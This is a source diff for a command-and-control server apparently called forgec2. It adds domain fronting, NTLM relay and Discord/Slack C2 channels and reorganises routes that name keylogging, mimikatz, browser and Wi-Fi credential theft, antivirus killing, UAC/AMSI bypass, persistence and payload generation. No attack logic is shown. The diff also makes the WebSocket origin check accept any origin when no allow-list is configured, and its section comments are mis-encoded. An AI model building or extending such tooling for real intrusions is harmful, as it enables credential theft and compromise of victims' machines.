@@ -1,4 +1,4 @@
-﻿package server
+package server
 
 import (
 	"context"
@@ -8,12 +8,14 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"log/slog"
 	"net"
 	"net/http"
 	"net/url"
 	"os"
 	"path/filepath"
+	"runtime/debug"
 	"sync"
 	"time"
 
@@ -24,6 +26,7 @@ import (
 	"github.com/forgec2/forgec2/internal/server/middleware"
 	"github.com/gin-gonic/gin"
 	"github.com/gorilla/websocket"
+	"github.com/prometheus/client_golang/prometheus"
 	"gorm.io/gorm"
 )
 
@@ -32,7 +35,7 @@ type Server struct {
 	db             *gorm.DB
 	router         *gin.Engine
 	wsClients      map[*websocket.Conn]UserSession
-	wsMutex        sync.Mutex
+	wsMutex        sync.RWMutex
 	wsUpgrader     websocket.Upgrader
 	rateLimiter    *middleware.RateLimiter
 	apiRateLimiter *middleware.APIRateLimiter
@@ -44,6 +47,7 @@ type Server struct {
 	icmpListener          *ICMPBeaconListener
 	grpcListener          *GRPCListener
 	smbLn                 net.Listener
+	tcpLn                 net.Listener
 	tcpProtoListener      *TCPProtoListener
 	screenMonitorImplants map[string]time.Time
 	screenMonitorMu       sync.Mutex
@@ -55,8 +59,15 @@ type Server struct {
 	trafficLog  *trafficRing
 	updateState updateCheckState
 
+	// Domain fronting
+	domainFrontDomains []string
+	domainFrontMu      sync.Mutex
+	domainFrontAuto    bool
+	domainFrontStatus  map[string]*frontDomainState
+
 	// WebSocket hub
-	wsHub *WebSocketHub
+	wsHub     *WebSocketHub
+	wsHubOnce sync.Once
 
 	// Event system
 	eventManager *EventManager
@@ -87,7 +98,44 @@ type Server struct {
 	// Each entry is keyed by "scheme://host:port".
 	extraListeners   map[string]io.Closer
 	extraListenersMu sync.Mutex
+
+	metrics *MetricsCollector
+
+	// NTLM relay session tracking
+	ntlmRelays *ntlmRelayStore
+
+	// Bulk operation history ring buffer
+	bulkHistory   []BulkResult
+	bulkHistoryMu sync.Mutex
+
+	// Per-agent task queue depth tracking (agentID → pending task count)
+	agentPendingTasks   map[string]int
+	agentPendingTasksMu sync.Mutex
+
+	// External C2 channels (WebSocket relay, Discord, Slack)
+	extC2Channels   map[string]*extC2WSChannel
+	extC2ChannelsMu sync.Mutex
+	extC2TaskQueue  map[string][]extC2Task
+	extC2TaskMu     sync.Mutex
+
+	// Async build job tracking
+	buildJobs   map[string]*BuildJob
+	buildJobsMu sync.RWMutex
 }
+
+// BulkResult tracks a batch command operation.
+type BulkResult struct {
+	ID        int       `json:"id"`
+	Timestamp time.Time `json:"timestamp"`
+	Command   string    `json:"command"`
+	TaskType  string    `json:"task_type"`
+	Created   int       `json:"tasks_created"`
+	Skipped   int       `json:"skipped_locked"`
+	Failed    int       `json:"failed"`
+	Operator  string    `json:"operator"`
+}
+
+const maxBulkHistory = 50
 
 func New(cfg *config.Config, database *gorm.DB) *Server {
 	gin.SetMode(gin.ReleaseMode)
@@ -105,8 +153,6 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		db:                    database,
 		router:                r,
 		wsClients:             make(map[*websocket.Conn]UserSession),
-		rateLimiter:           middleware.NewRateLimiter(cfg.RateLimit.Beacon.Limit, time.Duration(cfg.RateLimit.Beacon.Window)*time.Second),
-		apiRateLimiter:        middleware.NewAPIRateLimiter(cfg.RateLimit.API.Capacity, cfg.RateLimit.API.Rate),
 		loginLockout:          newLoginLockoutTracker(),
 		socksEngine:           newSocksRelayEngine(),
 		startTime:             time.Now(),
@@ -115,6 +161,12 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 		trafficLog:            newTrafficRing(),
 		eventManager:          NewEventManager(database),
 		extraListeners:        make(map[string]io.Closer),
+		domainFrontStatus:     make(map[string]*frontDomainState),
+		agentPendingTasks:     make(map[string]int),
+		ntlmRelays:            newNTLMRelayStore(),
+		extC2Channels:         make(map[string]*extC2WSChannel),
+		extC2TaskQueue:        make(map[string][]extC2Task),
+		buildJobs:             make(map[string]*BuildJob),
 		wsUpgrader: websocket.Upgrader{
 			ReadBufferSize:  1024,
 			WriteBufferSize: 1024,
@@ -130,12 +182,27 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 				// Frontend runs on localhost:3000, backend on localhost:8080
 				// — compare only hostname, since ports always differ.
 				originHost := u.Hostname()
-				return originHost == "localhost" || originHost == "127.0.0.1" || originHost == "::1"
+				if len(cfg.Server.AllowedOrigins) == 0 {
+					return true
+				}
+				for _, allowed := range cfg.Server.AllowedOrigins {
+					if originHost == allowed {
+						return true
+					}
+				}
+				return false
 			},
 		},
 	}
 
 	s.ctx, s.ctxCancel = context.WithCancel(context.Background())
+
+	// Initialize rate limiters with context for graceful shutdown
+	s.rateLimiter = middleware.NewRateLimiter(s.ctx, cfg.RateLimit.Beacon.Limit, time.Duration(cfg.RateLimit.Beacon.Window)*time.Second)
+	s.apiRateLimiter = middleware.NewAPIRateLimiter(s.ctx, cfg.RateLimit.API.Capacity, cfg.RateLimit.API.Rate)
+
+	// Start periodic cleanup for login lockout entries
+	s.loginLockout.startCleanup(s.ctx)
 
 	// Initialize beacon payload cipher if configured
 	if cfg.Crypto.Key != "" {
@@ -150,11 +217,15 @@ func New(cfg *config.Config, database *gorm.DB) *Server {
 
 	s.apiRateLimiter.SetWhitelist(cfg.RateLimit.API.Whitelist)
 
+	s.metrics = NewMetricsCollector(s)
+	s.metrics.Register(prometheus.DefaultRegisterer)
+	r.Use(metricsMiddleware(s.metrics))
+
 	s.setupRoutes()
 
 	// Initialize plugin marketplace
 	s.marketplace = plugin.NewMarketplace(database)
-	s.marketplace.StartUpdateChecker(6 * time.Hour)
+	s.marketplace.StartUpdateChecker(PluginUpdateCheckInterval)
 
 	// Initialize plugin execution manager
 	s.pluginManager = plugin.NewManager(database)
@@ -259,426 +330,36 @@ func (s *Server) setupRoutes() {
 	// Request logging middleware
 	s.router.Use(middleware.RequestLogger())
 
-	// Login routes (no auth required)
-	s.router.GET("/login", s.handleLoginPage)
-	s.router.POST("/login", s.handleLogin)
+	// CORS middleware — applies to all routes
+	s.router.Use(middleware.CORS(s.cfg.Server.AllowedOrigins))
 
-	// Health check endpoints (no auth required)
-	s.router.GET("/health", s.handleHealthCheck)
-	s.router.GET("/ready", s.handleHealthCheck)
-
-	// Language switch endpoint (no auth required)
-	s.router.GET("/lang/set", s.handleSetLanguage)
-	s.router.POST("/lang/set", s.handleSetLanguage)
+	// Unauthenticated routes
+	s.registerPublicRoutes()
 
 	// Protected routes
 	auth := s.router.Group("/")
 	auth.Use(middleware.AuthRequired(s.db))
+	auth.Use(middleware.CSRFProtect())
+	auth.Use(middleware.RequestBodyLimit(MaxJSONBodySize))
 	auth.Use(s.apiRateLimiter.LimitByUser())
 	auth.Use(s.AuditMiddleware())
 	auth.Use(s.ActivityMiddleware())
 	{
-		auth.GET("/", s.handleDashboard)
-		auth.GET("/dashboard", s.handleDashboard)
-		auth.GET("/search", s.handleSearchPage)
-		auth.GET("/api/search", s.handleAPISearch)
-
-		// 鈹€鈹€ Agent pages (read-only, no lock check) 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		agentsRead := auth.Group("/")
-		agentsRead.Use(middleware.RequirePermission(db.PermAgentsRead))
-		{
-			agentsRead.GET("/agents", s.handleAgents)
-			agentsRead.GET("/agents/:id", s.handleAgentDetail)
-			agentsRead.GET("/agents/:id/shell", s.handleShellPage)
-			agentsRead.GET("/agents/:id/files", s.handleFileBrowserPage)
-			agentsRead.GET("/agents/:id/screen", s.handleScreenMonitorPage)
-			agentsRead.GET("/agents/:id/tasks", s.handleGetAgentTasks)
-			agentsRead.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
-			agentsRead.GET("/api/agents", s.handleListAgents)
-			agentsRead.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
-			agentsRead.GET("/agents/:id/token", s.handleTokenPage)
-			agentsRead.GET("/agents/:id/token/list", s.handleGetTokens)
-			agentsRead.GET("/api/agents/:id/processes", s.handleGetProcesses)
-			agentsRead.GET("/api/agents/:id/process-tree", s.handleGetProcessTree)
-		}
-
-		// Agent operations (note, cancel/rerun, delete -- no lock)
-		agentsWrite := auth.Group("/")
-		agentsWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
-		{
-			agentsWrite.POST("/agents/:id/kill", s.handleKillAgent)
-			agentsWrite.POST("/agents/:id/note", s.handleUpdateNote)
-			agentsWrite.POST("/agents/:id/tasks/:taskId/cancel", s.handleCancelTask)
-			agentsWrite.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
-			agentsWrite.POST("/agents/batch", s.handleBatchCommand)
-			agentsWrite.POST("/api/agents/:id/input", s.handleAgentRemoteInput)
-			agentsWrite.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
-		}
-		agentsDelete := auth.Group("/")
-		agentsDelete.Use(middleware.RequirePermission(db.PermAgentsDelete))
-		{
-			agentsDelete.DELETE("/agents/:id", s.handleDeleteAgent)
-			agentsDelete.POST("/agents/batch/delete", s.handleBulkDeleteAgents)
-		}
-
-		// 鉂€ Agent commands 鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€
-		agentCmd := auth.Group("/agents/:id")
-		agentCmd.Use(middleware.RequirePermission(db.PermAgentsWrite))
-		{
-			agentCmd.POST("/command", s.handleSendCommand)
-			agentCmd.POST("/screenshot", s.handleRequestScreenshot)
-			agentCmd.POST("/screenshot_window", s.handleRequestScreenshotWindow)
-			agentCmd.POST("/ps", s.handleRequestPS)
-			agentCmd.POST("/keylogger/start", s.handleStartKeylogger)
-			agentCmd.POST("/keylogger/stop", s.handleStopKeylogger)
-			agentCmd.POST("/keylogger/dump", s.handleDumpKeylogger)
-			agentCmd.POST("/suspend", s.handleSuspendProcess)
-			agentCmd.POST("/resume", s.handleResumeProcess)
-			agentCmd.POST("/killproc", s.handleKillProcess)
-			agentCmd.POST("/clipboard/get", s.handleClipboardGet)
-			agentCmd.POST("/clipboard/set", s.handleClipboardSet)
-			agentCmd.POST("/find", s.handleFindFiles)
-			agentCmd.POST("/reg/get", s.handleRegGet)
-			agentCmd.POST("/reg/set", s.handleRegSet)
-			agentCmd.POST("/reg/delete", s.handleRegDelete)
-			agentCmd.POST("/reboot", s.handleReboot)
-			agentCmd.POST("/shutdown", s.handleShutdown)
-			agentCmd.POST("/drives", s.handleListDrives)
-			agentCmd.POST("/beacon_now", s.handleBeaconNow)
-			agentCmd.POST("/services", s.handleListServices)
-			agentCmd.POST("/portscan", s.handlePortScan)
-			agentCmd.POST("/netstat", s.handleNetstat)
-			agentCmd.POST("/users", s.handleUsers)
-			agentCmd.POST("/av", s.handleAV)
-			agentCmd.POST("/download_url", s.handleDownloadURL)
-			agentCmd.POST("/uninstall", s.handleUninstall)
-			agentCmd.POST("/set_sleep", s.handleSetSleep)
-			agentCmd.POST("/kill_av", s.handleKillAV)
-			agentCmd.POST("/elevate", s.handleElevate)
-			agentCmd.POST("/uac_bypass", s.handleUACBypass)
-			agentCmd.POST("/amsi_bypass", s.handleAMSIByPass)
-			agentCmd.POST("/etw_bypass", s.handleETWByPass)
-			agentCmd.POST("/elevate/printnightmare", s.handleElevatePrintNightmare)
-			agentCmd.POST("/execute_assembly", s.handleExecuteAssembly)
-			agentCmd.POST("/kerberoast", s.handleKerberoast)
-			agentCmd.POST("/mimikatz", s.handleMimikatz)
-			agentCmd.POST("/powerpick", s.handlePowerPick)
-			agentCmd.POST("/net", s.handleNetCommand)
-			agentCmd.POST("/persistence", s.handlePersistence)
-			agentCmd.POST("/bof", s.handleBOF)
-			agentCmd.POST("/browser_steal", s.handleBrowserSteal)
-			agentCmd.POST("/cookie_export", s.handleCookieExport)
-			agentCmd.POST("/vpn_creds", s.handleVpnCreds)
-			agentCmd.POST("/creds", s.handleCredsDump)
-			agentCmd.POST("/wifi_creds", s.handleWifiCreds)
-			agentCmd.POST("/privesc_check", s.handlePrivescCheck)
-			agentCmd.POST("/inject", s.handleInject)
-			agentCmd.POST("/spawn", s.handleSpawn)
-			agentCmd.POST("/self_update", s.handleSelfUpdate)
-			agentCmd.POST("/lateral", s.handleLateral)
-			agentCmd.POST("/socks", s.handleSocks)
-
-			// 鉂€ Reverse Port Forward 鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€鉂€
-			agentCmd.GET("/rportfwd/status", s.handleRPortFwdStatus)
-			agentCmd.POST("/rportfwd/start", s.handleRPortFwdRelayStart)
-			agentCmd.POST("/rportfwd/stop", s.handleRPortFwdRelayStop)
-
-			agentCmd.POST("/download", s.handleDownload)
-			agentCmd.POST("/upload", s.handleUploadFile)
-
-			// 鈹€鈹€ File browser 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-			agentCmd.POST("/files/ls", s.handleListDir)
-			agentCmd.POST("/files/delete", s.handleFileDelete)
-			agentCmd.POST("/files/read", s.handleFileRead)
-			agentCmd.POST("/files/upload", s.handleFileUploadFromAgent)
-
-			// 鈹€鈹€ Screen monitor 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-			agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
-			agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)
-
-			// 鈹€鈹€ Token Impersonation 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-			agentCmd.POST("/token/list_procs", s.handleTokenListProcs)
-			agentCmd.POST("/token/steal", s.handleTokenSteal)
-			agentCmd.POST("/token/make", s.handleTokenMake)
-			agentCmd.POST("/token/revert", s.handleTokenRevert)
-			agentCmd.POST("/token/whoami", s.handleTokenWhoami)
-			agentCmd.DELETE("/token/:token_id", s.handleTokenDrop)
-			agentCmd.POST("/token/:token_id/impersonate", s.handleTokenImpersonate)
-			agentCmd.POST("/token/:token_id/note", s.handleTokenNoteUpdate)
-
-			// 鈹€鈹€ SOCKS Relay (agent-side) 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-			agentCmd.POST("/socks_relay/start", s.handleStartSocksRelay)
-			agentCmd.POST("/socks_relay/stop", s.handleStopSocksRelay)
-		}
-
-		// 鈹€鈹€ Generate 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/generate", s.handleGeneratePage)
-		auth.GET("/api/generate/profiles", s.handleListProfiles)
-		auth.POST("/api/generate/profile/import", s.handleImportProfile)
-		auth.POST("/generate/exe", s.handleGenerateEXE)
-		auth.POST("/generate/ps1", s.handleGeneratePS1)
-		auth.POST("/generate/linux", s.handleGenerateLinux)
-		auth.POST("/generate/macos", s.handleGenerateMacOS)
-		auth.POST("/generate/stager", s.handleGenerateStager)
-		auth.POST("/generate/stager_linux", s.handleGenerateStagerLinux)
-		auth.POST("/generate/one-liner", s.handleGenerateOneLiner)
-		auth.POST("/generate/donut", s.handleGenerateDonut)
-		auth.POST("/generate/shellcode", s.handleGenerateShellcode)
-
-		// 鈹€鈹€ Listeners 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		listenersRead := auth.Group("/")
-		listenersRead.Use(middleware.RequirePermission(db.PermListenersRead))
-		{
-			listenersRead.GET("/listeners", s.handleListenersPage)
-			listenersRead.GET("/listeners/:id", s.handleListenerDetail)
-			listenersRead.GET("/api/listeners", s.handleListListeners)
-		}
-		listenersWrite := auth.Group("/")
-		listenersWrite.Use(middleware.RequirePermission(db.PermListenersWrite))
-		{
-			listenersWrite.POST("/api/listeners", s.handleCreateListener)
-			listenersWrite.PUT("/api/listeners/:id", s.handleUpdateListener)
-		}
-		listenersDelete := auth.Group("/")
-		listenersDelete.Use(middleware.RequirePermission(db.PermListenersDelete))
-		{
-			listenersDelete.DELETE("/api/listeners/:id", s.handleDeleteListener)
-		}
-
-		// 鈹€鈹€ Infrastructure 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/infrastructure", s.handleInfrastructurePage)
-		auth.POST("/infrastructure/generate/nginx", s.handleGenerateNginx)
-		auth.POST("/infrastructure/generate/apache", s.handleGenerateApache)
-		auth.POST("/infrastructure/generate/haproxy", s.handleGenerateHAProxy)
-		auth.POST("/infrastructure/acme/provision", s.handleACMECertProvision)
-		auth.GET("/infrastructure/profile/export", s.handleProfileExport)
-
-		// 鈹€鈹€ Automation 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/automation", s.handleAutomationPage)
-		auth.GET("/api/automation/rules", s.handleListAutomationRules)
-		auth.POST("/api/automation/rules", s.handleSaveAutomationRule)
-		auth.PUT("/api/automation/rules/:id", s.handleUpdateAutomationRule)
-		auth.DELETE("/api/automation/rules/:id", s.handleDeleteAutomationRule)
-		auth.POST("/api/automation/rules/:id/toggle", s.handleToggleAutomationRule)
-		auth.GET("/api/webhooks", s.handleListWebhooks)
-		auth.POST("/api/webhooks", s.handleCreateWebhook)
-		auth.DELETE("/api/webhooks/:id", s.handleDeleteWebhook)
-		auth.POST("/api/webhooks/test", s.handleTestWebhook)
-
-		// 鈹€鈹€ BOF Repository 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/bof_repo", func(c *gin.Context) {
-			s.renderPageOrJSON(c, gin.H{"Title": "BOF Repository", "ActiveNav": "bof_repo"})
-		})
-		auth.GET("/api/bof/repos", s.handleBOFRepoIndex)
-		auth.POST("/api/bof/repos/import", s.handleBOFRepoImport)
-
-		// 鈹€鈹€ Plugin Management 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/plugins", s.handlePluginsPage)
-		auth.GET("/api/plugins", s.handlePluginList)
-		auth.POST("/api/plugins", s.handlePluginCreate)
-		auth.GET("/api/plugins/update-summary", s.handlePluginUpdateSummary)
-		auth.POST("/api/plugins/check-updates", s.handlePluginCheckUpdates)
-		auth.POST("/api/plugins/import", s.handlePluginImport)
-		auth.GET("/api/plugins/:id", s.handlePluginGet)
-		auth.GET("/api/plugins/:id/rating", s.handlePluginRating)
-		auth.GET("/api/plugins/:id/reviews", s.handlePluginReviews)
-		auth.POST("/api/plugins/:id/reviews", s.handlePluginAddReview)
-		auth.GET("/api/plugins/:id/dependencies", s.handlePluginDependencies)
-		auth.GET("/api/plugins/:id/update-status", s.handlePluginUpdateStatus)
-		auth.POST("/api/plugins/:id/update", s.handlePluginUpdate)
-		auth.GET("/api/plugins/:id/export", s.handlePluginExport)
-		auth.POST("/api/plugins/:id/toggle", s.handlePluginToggle)
-		auth.DELETE("/api/plugins/:id", s.handlePluginDelete)
-
-		// 鈹€鈹€ Plugin Execution 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/api/plugins/:id/execute", s.handlePluginExecuteInfo)
-		auth.POST("/api/plugins/:id/execute", s.handlePluginExecute)
-		auth.POST("/api/plugins/:id/report", s.handlePluginReport)
-		auth.POST("/api/plugins/install", s.handlePluginInstall)
-		auth.POST("/api/plugins/:id/enable", s.handlePluginEnable)
-		auth.POST("/api/plugins/:id/disable", s.handlePluginDisable)
-
-		// 鈹€鈹€ Tasks 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		tasksRead := auth.Group("/")
-		tasksRead.Use(middleware.RequirePermission(db.PermTasksRead))
-		{
-			tasksRead.GET("/tasks", s.handleTaskHistory)
-			tasksRead.GET("/tasks/export", s.handleExportTasks)
-			tasksRead.GET("/tasks/:taskId", s.handleGetTaskStatus)
-		}
-
-		// 鈹€鈹€ Auth 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.POST("/logout", s.handleLogout)
-
-		// 鈹€鈹€ Credentials 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		credsRead := auth.Group("/")
-		credsRead.Use(middleware.RequirePermission(db.PermCredsRead))
-		{
-			credsRead.GET("/credentials", s.handleCredentialsPage)
-			credsRead.GET("/credentials/export", s.handleExportCredentials)
-			credsRead.GET("/credentials/:cred_id", s.handleGetCredential)
-		}
-		credsWrite := auth.Group("/")
-		credsWrite.Use(middleware.RequirePermission(db.PermCredsWrite))
-		{
-			credsWrite.POST("/credentials/add", s.handleAddCredential)
-			credsWrite.PUT("/credentials/:cred_id", s.handleUpdateCredential)
-			credsWrite.POST("/credentials/batch/tags", s.handleBatchAddTags)
-			credsWrite.POST("/credentials/:cred_id/confirm", s.handleToggleConfirmed)
-		}
-		credsDelete := auth.Group("/")
-		credsDelete.Use(middleware.RequirePermission(db.PermCredsDelete))
-		{
-			credsDelete.DELETE("/credentials/:cred_id", s.handleDeleteCredential)
-		}
-
-		// 鈹€鈹€ Pivoting / Topology / Loot / Scanner 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/pivoting", s.handlePivoting)
-		auth.GET("/topology", s.handleTopologyPage)
-		auth.GET("/api/topology/data", s.handleTopologyData)
-		auth.GET("/loot", s.handleLootPage)
-		auth.GET("/scanner", s.handleScannerPage)
-		auth.POST("/api/scan", s.handleScanTask)
-		auth.GET("/api/scan/results/:taskId", s.handleScanResults)
-		auth.GET("/api/scan/agent/:agentId", s.handleScanResultsByAgent)
-		auth.POST("/api/scan/result", s.handleProcessScanResult)
-		auth.GET("/api/scan/export/:taskId", s.handleExportScanResults)
-		auth.POST("/api/browser/result", s.handleProcessBrowserResult)
-		auth.POST("/api/wifi/result", s.handleProcessWifiResult)
-		auth.POST("/api/lateral/result", s.handleProcessLateralResult)
-		auth.POST("/api/privesc/result", s.handleProcessPrivescResult)
-		auth.GET("/privesc", s.handlePrivescPage)
-		auth.GET("/api/privesc/history/:id", s.handlePrivescHistory)
-
-		// 鈹€鈹€ Post-Exploitation Toolkit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/toolkit", s.handleToolkitPage)
-		auth.POST("/toolkit/agents/:id/action", s.handleToolkitQuickAction)
-		auth.GET("/toolkit/results", s.handleToolkitRecentResults)
-		auth.GET("/toolkit/agents/:id/info", s.handleToolkitAgentInfo)
-		auth.GET("/toolkit/agents/:id/tasks", s.handleToolkitAgentTasks)
-
-		// 鈹€鈹€ Timeline 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/timeline", s.handleTimelinePage)
-		auth.GET("/api/timeline/data", s.handleTimelineData)
-		auth.GET("/api/timeline/export", s.handleTimelineExport)
-
-		// 鈹€鈹€ Report 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/report", s.handleReportPage)
-		auth.GET("/api/report/agents", s.handleAPIGetReportAgents)
-		auth.GET("/api/report/tasks", s.handleAPIGetReportTasks)
-		auth.GET("/api/report/credentials", s.handleAPIGetReportCredentials)
-		auth.GET("/api/report/network", s.handleAPIGetReportNetwork)
-		auth.GET("/api/report/findings", s.handleAPIGetReportFindings)
-		auth.GET("/api/report/history", s.handleAPIGetReportHistory)
-		auth.POST("/api/report/generate", s.handleGenerateReport)
-		auth.GET("/api/report/export/pdf", s.handleAPIExportReportPDF)
-		auth.DELETE("/api/report/:id", s.handleAPIDeleteReport)
-
-		// 鈹€鈹€ Lateral Movement 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/lateral", s.handleLateralPage)
-		auth.POST("/api/lateral/execute", s.handleAPILateralExecute)
-		auth.GET("/api/lateral/history/:id", s.handleLateralHistory)
-
-		// 鈹€鈹€ Command Templates 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auth.GET("/templates", s.handleTemplatesPage)
-		auth.POST("/api/templates", s.handleCreateTemplate)
-		auth.PUT("/api/templates/:id", s.handleUpdateTemplate)
-		auth.DELETE("/api/templates/:id", s.handleDeleteTemplate)
-		auth.GET("/api/templates/category/:category", s.handleGetTemplatesByCategory)
-
-		// 鈹€鈹€ Audit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-		auditRead := auth.Group("/")
